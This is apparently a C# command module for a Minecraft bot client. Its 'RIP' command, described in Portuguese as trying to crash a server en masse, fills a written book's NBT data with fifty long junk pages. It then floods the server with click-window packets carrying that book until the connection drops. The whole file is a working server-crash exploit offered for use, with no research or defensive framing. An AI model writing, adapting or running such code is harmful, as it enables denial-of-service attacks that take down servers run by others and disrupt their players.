using AdvancedBot.client;
using AdvancedBot.client.Commands;
using AdvancedBot.client.Map;
using AdvancedBot.client.NBT;
using AdvancedBot.client.Packets;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Crash
{
    class RipCommand : CommandBase
    {
        private static ItemStack book = new ItemStack(Items.written_book);
        public RipCommand(MinecraftClient cli)
            : base(cli, "RIP", "Tenta crashar um servidor em massa", "rip")
        {
        }
        public override CommandResult Run(string alias, string[] args)
        {
            Toggle(args);
            book = new ItemStack(Items.written_book);
            Client.PrintToChat("§eCrashando servidor...");
            var task = Task.Run(async () => {
                try
                {
                    ListTag<StringTag> list = new ListTag<StringTag>();
                    CompoundTag tag = new CompoundTag();
                    String author = Client.Username;
                    String title = "Title";
                    String size = "wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453bb543yb54y5 h3y4h97,i567yb64t5";
                    for (int i = 0; i < 50; ++i)
                    {
                        String siteContent = size;
                        StringTag tString = new StringTag("", siteContent);
                        list.AddTag(tString);
                    }
                    tag.AddString("author", author);
                    tag.AddString("title", title);
                    tag.Add("pages", list);
                    book.NBTData = tag;
                    book.NBTData.Add("pages", list);

                    while (Client.IsBeingTicked())
                    {
                        // new C0EPacketClickWindow(5, 1, 1, 5, itemStack, Short.MAX_VALUE
                        Client.SendPacket(new PacketClickWindow
                            (5, 1, 1, Byte.MaxValue, 5, book));
                        Thread.Sleep(12);
                    }
                    Client.PrintToChat("§eParando o envio de packets, o cliente foi desconectado");
                }
                catch (Exception e) { Debug.WriteLine(e.ToString()); }
            });
            return CommandResult.Success;
        }
    }
}
